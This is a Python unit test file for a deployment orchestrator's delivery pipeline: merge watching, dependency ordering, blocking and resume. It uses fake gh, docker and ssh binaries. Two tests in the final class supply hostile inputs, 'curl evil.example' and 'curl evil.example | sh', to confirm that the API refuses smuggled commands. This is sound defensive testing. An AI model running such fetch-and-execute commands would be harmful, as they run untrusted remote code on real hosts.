"""The delivery pipeline (#60): merges noticed anywhere, ordering, blocking, and the one story.

Nothing real is deployed and nothing is pulled, dispatched or written over SSH: `gh`, `docker` and
`ssh` are fake executables on PATH that record their arguments and print what the test needs.

    RELAY_DATA_DIR is set to a temporary folder before Relay is imported, so nothing touches real settings.
    python -m unittest tests.test_delivery -v
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parent.parent
TMP = tempfile.mkdtemp(prefix="relay-delivery-test-")
os.environ.setdefault("RELAY_DATA_DIR", TMP)
os.environ["RELAY_ALLOW_LOOPBACK_ADMIN"] = "1"
BIN = Path(TMP) / "fakebin"
BIN.mkdir(parents=True, exist_ok=True)
sys.path.insert(0, str(ROOT))

from orchestrator import config as C  # noqa: E402
from orchestrator import delivery, deploy, systemmap  # noqa: E402
from orchestrator.manager import Manager  # noqa: E402

CALLS = BIN / "calls.log"
ORG = "metratek-telematics"


def fake(name: str, body: str) -> None:
    path = BIN / name
    path.write_text("#!/bin/sh\nprintf '%s' \"$0\" >> " + str(CALLS) + "\n"
                    "for a in \"$@\"; do printf ' %s' \"$a\" >> " + str(CALLS) + "; done\n"
                    "printf '\\n' >> " + str(CALLS) + "\n" + body, encoding="utf-8")
    path.chmod(0o755)


# One merged pull request per repository, and the workflow lookups an actions target needs.
MERGED_PRS = {
    "decoder-repo": '[{"number":11,"title":"decoder change","url":"https://example.invalid/pr/11",'
                    '"mergedAt":"2026-09-24T10:00:00Z","mergeCommit":{"oid":"dec111"},'
                    '"headRefName":"feat/x","author":{"login":"owner"},"baseRefName":"main"}]',
    "app-repo": '[{"number":22,"title":"app change","url":"https://example.invalid/pr/22",'
                '"mergedAt":"2026-09-24T10:05:00Z","mergeCommit":{"oid":"app222"},'
                '"headRefName":"feat/y","author":{"login":"owner"},"baseRefName":"main"}]',
}
_CASES = "\n".join(f'    *{repo}*) printf \'%s\\n\' \'{rows}\' ;;' for repo, rows in MERGED_PRS.items())
fake("gh", f'''
case "$1 $2" in
  "pr list")
    case "$*" in
{_CASES}
    *) echo "[]" ;;
    esac ;;
  "run list") printf '[{{"databaseId": 7, "status": "completed", "conclusion": "success", "url": "https://example.invalid/run/7", "headSha": "abc"}}]\\n' ;;
  "run watch") echo "run watch ok" ;;
  "run view") echo "run view ok" ;;
  *) echo "gh: $*" ;;
esac
exit 0
''')
fake("docker", 'echo "docker $*"\nexit 0\n')
# A command carrying the marker fails, so a test can make exactly one target fail on a host.
fake("ssh", '''
case "$*" in
  *make-this-fail*) echo "host: command failed"; exit 3 ;;
esac
echo "ssh-ran: $*"
exit 0
''')


def calls() -> list[str]:
    return CALLS.read_text(encoding="utf-8").splitlines() if CALLS.exists() else []


def clear_calls() -> None:
    CALLS.write_text("", encoding="utf-8")


def target(**kw) -> dict:
    t = {"id": "t1", "repo": "decoder-repo", "host": "edge", "service": "svc", "method": "manual",
         "commands": [], "never_pull": False, "critical": False, "risk": "", "note": "",
         "workflow": "", "workflow_repo": "", "branch": "main", "site": "", "image": "",
         "enabled": True, "auto_on_merge": True, "last_run": None}
    t.update(kw)
    return t


def write_map(targets) -> None:
    deploy.save({"version": 1, "seeded_at": "now", "seeded_from": [],
                 "hosts": {"edge": {"ssh": "edge-test", "note": ""}, "z2": {"ssh": "", "note": ""}},
                 "targets": targets})


def write_system_map() -> None:
    """A two-component system: the app calls the decoder's feed, and the edge is approved."""
    systemmap.save({"version": 1, "scanned_at": "now", "updated": "now",
                    "components": [
                        {"id": "app-repo", "name": "app-repo", "repo": f"{ORG}/app-repo", "path": "",
                         "kind": "frontend", "description": "", "runs": "", "provides": []},
                        {"id": "decoder-repo", "name": "decoder-repo", "repo": f"{ORG}/decoder-repo", "path": "",
                         "kind": "api", "description": "", "runs": "", "provides": []}],
                    "edges": [
                        {"id": "e1", "from": "app-repo", "to": "decoder-repo", "via": "http",
                         "details": "the app reads its feed", "status": "approved", "evidence": [], "source": "manual"}]})


def reset_ledger(started_at="2026-09-24T00:00:00Z") -> None:
    delivery.save_ledger({"version": 1, "started_at": started_at, "last_poll": None, "error": None, "seen": {}})


class Base(unittest.TestCase):
    def setUp(self):
        # Several test modules share one process: make sure the fakes here win for this test.
        old_path = os.environ.get("PATH", "")
        os.environ["PATH"] = f"{BIN}{os.pathsep}{old_path}"
        self.addCleanup(lambda: os.environ.__setitem__("PATH", old_path))
        clear_calls()
        write_system_map()
        reset_ledger()
        self.events = []
        self.manager = Manager(lambda typ, payload: self.events.append((typ, payload)))
        for row in list(self.manager.store.list()):  # the test modules share one data folder
            self.manager.store.remove(row["id"])
        self.manager._cfg = dict(C.DEFAULTS)
        self.manager._cfg_at = 10 ** 20

    def tearDown(self):
        self.manager.stop_merge_watcher()
        self.manager.stop_redeploy_watcher()


class OrderingTests(Base):
    """A service deploys before the thing that calls it, and the plan says why."""

    def test_the_system_map_reorders_the_deployment_map(self):
        # File order is app first; the approved edge says the decoder provides what the app reads.
        targets = [target(id="app", repo="app-repo"), target(id="decoder", repo="decoder-repo")]
        steps = delivery.plan(targets)
        self.assertEqual(steps["order"], ["decoder", "app"])
        row = next(s for s in steps["steps"] if s["target"] == "app")
        self.assertEqual(row["after"], ["decoder"])
        self.assertIn("decoder-repo before app-repo", row["reason"])
        self.assertIn("the app reads its feed", row["reason"])
        self.assertEqual(next(s for s in steps["steps"] if s["target"] == "decoder")["before"], ["app"])

    def test_a_proposed_edge_does_not_order_anything(self):
        data = systemmap.load()
        data["edges"][0]["status"] = "proposed"
        systemmap.save(data)
        steps = delivery.plan([target(id="app", repo="app-repo"), target(id="decoder", repo="decoder-repo")])
        self.assertEqual(steps["order"], ["app", "decoder"])  # deployment-map order, unchanged
        self.assertIn("No approved edge", steps["steps"][0]["reason"])

    def test_two_targets_of_one_repository_keep_their_map_order(self):
        steps = delivery.plan([target(id="a", repo="decoder-repo"), target(id="b", repo="decoder-repo")])
        self.assertEqual(steps["order"], ["a", "b"])
        self.assertEqual(steps["reasons"], [])

    def test_a_cycle_falls_back_to_the_map_order_and_says_so(self):
        data = systemmap.load()
        data["edges"].append({"id": "e2", "from": "decoder-repo", "to": "app-repo", "via": "http",
                              "details": "callback", "status": "approved", "evidence": [], "source": "manual"})
        systemmap.save(data)
        steps = delivery.plan([target(id="app", repo="app-repo"), target(id="decoder", repo="decoder-repo")])
        self.assertEqual(steps["order"], ["app", "decoder"])
        self.assertTrue(steps["cycles"])
        self.assertIn("loop", steps["steps"][0]["reason"])

    def test_the_plan_is_stable(self):
        targets = [target(id="app", repo="app-repo"), target(id="decoder", repo="decoder-repo"),
                   target(id="other", repo="unrelated-repo")]
        first = delivery.plan(targets)["order"]
        self.assertEqual(first, delivery.plan(targets)["order"])
        self.assertEqual(first, ["decoder", "app", "other"])


class BlockingTests(Base):
    """A failure stops what depends on it, and nothing is run for those targets."""

    def setUp(self):
        super().setUp()
        self.targets = [
            target(id="app", repo="app-repo", method="image_pull", service="app",
                   commands=["cd /opt && docker compose up -d app"]),
            target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                   commands=["cd /opt && docker compose pull make-this-fail"]),
        ]
        write_map(self.targets)

    def test_a_failed_provider_blocks_its_caller_and_nothing_else_runs(self):
        record = delivery.run_plan(delivery.plan(self.targets), trigger="pr_merged", automatic=True)
        self.assertEqual([r["target"] for r in record["targets"]], ["decoder", "app"])
        self.assertEqual(record["targets"][0]["status"], "failed")
        self.assertEqual(record["targets"][1]["status"], "not_attempted")
        self.assertEqual(record["targets"][1]["blocked_by"], "decoder")
        self.assertIn("not attempted because decoder failed", record["targets"][1]["detail"])
        self.assertEqual(record["status"], "failed")
        self.assertEqual(record["half_deployed"], {"deployed": [], "not_deployed": ["decoder", "app"],
                                                   "failed": ["decoder"], "resume_from": "decoder"})
        self.assertTrue(record["can_resume"])
        # the blocked target was never run: no command of its own reached the host
        self.assertFalse(any("up -d app" in c for c in calls()))

    def test_an_unrelated_target_still_deploys(self):
        targets = self.targets + [target(id="other", repo="unrelated-repo", method="image_pull",
                                         service="other", commands=["cd /opt && docker compose up -d other"])]
        write_map(targets)
        record = delivery.run_plan(delivery.plan(targets), trigger="pr_merged", automatic=True)
        by = {r["target"]: r["status"] for r in record["targets"]}
        self.assertEqual(by, {"decoder": "failed", "app": "not_attempted", "other": "succeeded"})
        self.assertEqual(record["half_deployed"]["deployed"], ["other"])

    def test_resume_runs_only_what_is_not_deployed(self):
        tid = "task-block"
        self.manager.store.add({"id": tid, "name": "Blocked change", "status": "done",
                                "github_repo": f"{ORG}/decoder-repo", "pr_number": 11, "workflow": {}, "events": []})
        self.manager._run_deploy(tid, self.targets, trigger="pr_merged", automatic=False)
        # the decoder stops failing; resuming runs it and its blocked caller, and nothing else
        write_map([target(id="app", repo="app-repo", method="image_pull", service="app",
                          commands=["cd /opt && docker compose up -d app"]),
                   target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                          commands=["cd /opt && docker compose pull decoder"])])
        clear_calls()
        record = self.manager.resume_deploy(tid)
        self.assertEqual(record["status"], "succeeded")
        self.assertEqual([r["status"] for r in record["targets"]], ["succeeded", "succeeded"])
        self.assertEqual(record["trigger"], "resume")

    def test_resume_keeps_a_target_that_already_succeeded(self):
        targets = [target(id="first", repo="unrelated-repo", method="image_pull", service="first",
                          commands=["cd /opt && docker compose up -d first"]),
                   target(id="second", repo="other-repo", method="image_pull", service="second",
                          commands=["cd /opt && docker compose up -d make-this-fail"])]
        write_map(targets)
        tid = "task-partial"
        self.manager.store.add({"id": tid, "name": "Partial", "status": "done",
                                "github_repo": f"{ORG}/unrelated-repo", "pr_number": 1, "workflow": {}, "events": []})
        first = self.manager._run_deploy(tid, targets, trigger="manual", automatic=False)
        self.assertEqual(first["half_deployed"], {"deployed": ["first"], "not_deployed": ["second"],
                                                  "failed": ["second"], "resume_from": "second"})
        clear_calls()
        record = self.manager.resume_deploy(tid)
        kept = next(r for r in record["targets"] if r["target"] == "first")
        self.assertEqual(kept["status"], "succeeded")
        self.assertIn("kept from the earlier run", kept["detail"])
        self.assertFalse(any("up -d first" in c for c in calls()))


class MergeWatcherTests(Base):
    """A merge made anywhere deploys the same way, once."""

    def setUp(self):
        super().setUp()
        write_map([target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                          commands=["cd /opt && docker compose pull decoder"])])

    def test_only_repositories_with_an_automatic_target_are_polled(self):
        self.assertEqual(delivery.watched_repos(), [f"{ORG}/decoder-repo"])
        write_map([target(id="decoder", repo="decoder-repo", enabled=False)])
        self.assertEqual(delivery.watched_repos(), [])
        write_map([target(id="decoder", repo="decoder-repo", critical=True)])
        self.assertEqual(delivery.watched_repos(), [])
        self.assertEqual(calls(), [])  # nothing is asked of GitHub either

    def test_a_merge_outside_a_task_deploys_its_targets(self):
        self.manager._merge_sweep()
        self.assertTrue(any("docker compose pull decoder" in c for c in calls()))
        rows = delivery.merge_records()
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertEqual(row["key"], f"{ORG}/decoder-repo#11")
        self.assertEqual(row["source"], "merge watcher")
        self.assertEqual(row["deploy"]["status"], "succeeded")
        self.assertEqual(row["deploy"]["trigger"], "merge_watcher")
        self.assertEqual(row["deploy"]["targets"][0]["target"], "decoder")

    def test_a_second_sweep_never_deploys_the_same_merge_again(self):
        self.manager._merge_sweep()
        clear_calls()
        self.manager._merge_sweep()
        self.manager._merge_sweep()
        self.assertFalse(any("docker compose" in c for c in calls()))
        self.assertEqual(len(delivery.merge_records()), 1)

    def test_merges_older_than_the_watcher_are_history(self):
        reset_ledger("2026-09-25T00:00:00Z")  # the watcher started after both merges
        self.manager._merge_sweep()
        self.assertEqual(delivery.new_merges(), [])
        self.assertFalse(any("docker compose" in c for c in calls()))

    def test_a_merge_of_a_task_pull_request_is_left_to_the_task(self):
        self.manager.store.add({"id": "task-own", "name": "Own", "status": "done",
                                "github_repo": f"{ORG}/decoder-repo", "pr_number": 11,
                                "pr_url": "https://example.invalid/pr/11", "workflow": {}, "events": []})
        self.manager._merge_sweep()
        row = delivery.merge_records()[0]
        self.assertEqual(row["source"], "task pull request")
        self.assertEqual(row["task"], "task-own")
        self.assertFalse(any("docker compose" in c for c in calls()))

    def test_a_disabled_target_is_recorded_but_never_run(self):
        write_map([target(id="decoder", repo="decoder-repo", enabled=False, method="image_pull",
                          commands=["cd /opt && docker compose pull decoder"]),
                   target(id="app", repo="app-repo", method="image_pull",
                          commands=["cd /opt && docker compose pull app"])])
        self.manager._merge_sweep()
        rows = {r["key"]: r for r in delivery.merge_records()}
        self.assertFalse(any("pull decoder" in c for c in calls()))
        self.assertIn(f"{ORG}/app-repo#22", rows)


class StoryTests(Base):
    """One structure per change: plan, repositories, pull requests, merges, deployments, blocked."""

    def setUp(self):
        super().setUp()
        self.targets = [
            target(id="app", repo="app-repo", method="image_pull", service="app",
                   commands=["cd /opt && docker compose up -d app"]),
            target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                   commands=["cd /opt && docker compose pull decoder"]),
        ]
        write_map(self.targets)
        self.task = {"id": "task-story", "name": "Cross-repository change", "status": "done",
                     "github_repo": f"{ORG}/app-repo", "pr_number": 22, "pr_url": "https://example.invalid/pr/22",
                     "branch": "feat/y", "workflow": {}, "events": [],
                     "repos": [{"repo": "/repos/app", "role": "primary", "github_repo": f"{ORG}/app-repo"},
                               {"repo": "/repos/decoder", "role": "related", "github_repo": f"{ORG}/decoder-repo",
                                "reason": "the app reads its feed"}],
                     "repo_worktrees": {"decoder": {"repo": "/repos/decoder", "github_repo": f"{ORG}/decoder-repo",
                                                    "pr_number": 11, "pr_url": "https://example.invalid/pr/11",
                                                    "branch": "feat/y"}}}
        self.manager.store.add(dict(self.task))

    def test_the_story_matches_what_actually_happened(self):
        record = self.manager._run_deploy("task-story", self.targets, trigger="pr_merged", automatic=True)
        self.assertEqual([r["target"] for r in record["targets"]], ["decoder", "app"])
        s = self.manager.delivery_story("task-story")
        self.assertEqual(s["state"], "deployed")
        self.assertEqual(s["task"]["name"], "Cross-repository change")
        self.assertEqual([r["repo"] for r in s["repositories"]], [f"{ORG}/app-repo", f"{ORG}/decoder-repo"])
        self.assertEqual(sorted(p["number"] for p in s["pull_requests"]), [11, 22])
        self.assertEqual(s["plan"]["order"], ["decoder", "app"])
        self.assertIn("the app reads its feed", " ".join(s["plan"]["reasons"]))
        # every deployment carries host, method, outcome, duration and a log path
        for d in s["deployments"]:
            self.assertEqual(d["host"], "edge")
            self.assertEqual(d["method"], "image_pull")
            self.assertEqual(d["status"], "succeeded")
            self.assertIsNotNone(d["duration"])
            self.assertTrue(Path(d["log_path"]).exists())
            self.assertEqual(d["trigger"], "pr_merged")
            self.assertIsNotNone(d["position"])
            self.assertTrue(d["order_reason"])
        self.assertEqual(s["blocked"], [])
        self.assertEqual(s["half_deployed"]["deployed"], ["decoder", "app"])
        self.assertFalse(s["can_resume"])
        self.assertIn("2/2 targets deployed", s["summary"])

    def test_a_half_deployed_story_says_exactly_what_is_missing(self):
        write_map([target(id="app", repo="app-repo", method="image_pull", service="app",
                          commands=["cd /opt && docker compose up -d app"]),
                   target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                          commands=["cd /opt && docker compose pull make-this-fail"])])
        targets = deploy.list_targets()
        self.manager._run_deploy("task-story", targets, trigger="pr_merged", automatic=True)
        s = self.manager.delivery_story("task-story")
        self.assertEqual(s["state"], "failed")
        self.assertEqual(s["blocked"], [{"target": "app", "repo": "app-repo", "because": "decoder",
                                         "reason": "not attempted because decoder failed"}])
        self.assertEqual(s["half_deployed"]["resume_from"], "decoder")
        self.assertTrue(s["can_resume"])
        self.assertIn("decoder failed", s["summary"])
        self.assertIn("app not attempted", s["summary"])

    def test_a_story_before_anything_ran_shows_the_plan_as_pending(self):
        s = self.manager.delivery_story("task-story")
        self.assertEqual(s["state"], "in review")
        self.assertEqual([d["status"] for d in s["deployments"]], ["pending", "pending"])
        self.assertEqual(s["plan"]["order"], ["decoder", "app"])

    def test_a_merge_with_no_task_gets_the_same_structure(self):
        self.manager.store.remove("task-story")
        write_map([target(id="decoder", repo="decoder-repo", method="image_pull", service="decoder",
                          commands=["cd /opt && docker compose pull decoder"])])
        self.manager._merge_sweep()
        row = delivery.merge_records()[0]
        s = delivery.merge_story(row)
        self.assertEqual(s["state"], "deployed")
        self.assertIsNone(s["task"]["id"])
        self.assertEqual(s["pull_requests"][0]["number"], 11)
        self.assertEqual(s["deployments"][0]["target"], "decoder")
        for key in ("plan", "repositories", "pull_requests", "merges", "deployments", "blocked",
                    "half_deployed", "can_resume", "state", "summary"):
            self.assertIn(key, s)


class RulesStillHoldTests(Base):
    """Nothing #53 forbids becomes possible because a merge was noticed elsewhere."""

    def test_the_watcher_never_runs_a_critical_or_disabled_target(self):
        write_map([target(id="crit", repo="decoder-repo", critical=True, method="image_pull",
                          commands=["cd /opt && docker compose pull decoder"]),
                   target(id="off", repo="decoder-repo", enabled=False, method="image_pull",
                          commands=["cd /opt && docker compose pull decoder"])])
        self.assertEqual(delivery.watched_repos(), [])
        self.manager._merge_sweep()
        self.assertFalse(any("docker compose" in c for c in calls()))

    def test_never_pull_is_still_refused_and_blocks_its_dependents(self):
        targets = [target(id="app", repo="app-repo", method="image_pull",
                          commands=["cd /opt && docker compose up -d app"]),
                   target(id="decoder", repo="decoder-repo", method="image_pull", never_pull=True,
                          image="local-only", commands=["cd /opt && docker compose pull decoder"])]
        write_map(targets)
        record = delivery.run_plan(delivery.plan(targets), trigger="merge_watcher", automatic=True)
        self.assertEqual(record["targets"][0]["status"], "refused")
        self.assertEqual(record["targets"][1]["status"], "not_attempted")
        self.assertEqual(record["status"], "blocked")
        self.assertFalse(any("docker" in c for c in calls()))

    def test_the_plan_endpoint_runs_nothing_and_takes_no_command(self):
        import web_app

        write_map(self.plan_targets())
        original = web_app.manager
        web_app.manager = self.manager
        try:
            client = web_app.app.test_client()
            r = client.get("/api/deploy/plan?target=app&target=decoder&command=curl+evil.example")
            self.assertEqual(r.status_code, 200)
            self.assertEqual(r.get_json()["order"], ["decoder", "app"])
            self.assertEqual(calls(), [])
        finally:
            web_app.manager = original

    def test_the_delivery_api_returns_one_story_per_change(self):
        import web_app

        write_map(self.plan_targets())
        self.manager.store.add({"id": "task-api", "name": "API story", "status": "done",
                                "github_repo": f"{ORG}/app-repo", "pr_number": 22,
                                "pr_url": "https://example.invalid/pr/22", "workflow": {}, "events": []})
        original = web_app.manager
        web_app.manager = self.manager
        try:
            client = web_app.app.test_client()
            listing = client.get("/api/delivery").get_json()
            self.assertEqual([s["task"]["id"] for s in listing["stories"]], ["task-api"])
            self.assertIn("watcher", listing)
            one = client.get("/api/delivery/task-api").get_json()
            # the task touched one repository, so its story plans that repository's targets only
            self.assertEqual(one["plan"]["order"], ["app"])
            merges = client.get("/api/delivery/merges").get_json()
            self.assertIn("started_at", merges)
            # nothing to resume yet, and the body cannot smuggle a command
            r = client.post("/api/delivery/task-api/resume", json={"command": "curl evil.example | sh"})
            self.assertEqual(r.status_code, 400)
            self.assertFalse(any("curl" in c for c in calls()))
        finally:
            web_app.manager = original

    def plan_targets(self):
        return [target(id="app", repo="app-repo", method="image_pull",
                       commands=["cd /opt && docker compose up -d app"]),
                target(id="decoder", repo="decoder-repo", method="image_pull",
                       commands=["cd /opt && docker compose pull decoder"])]


if __name__ == "__main__":
    unittest.main()
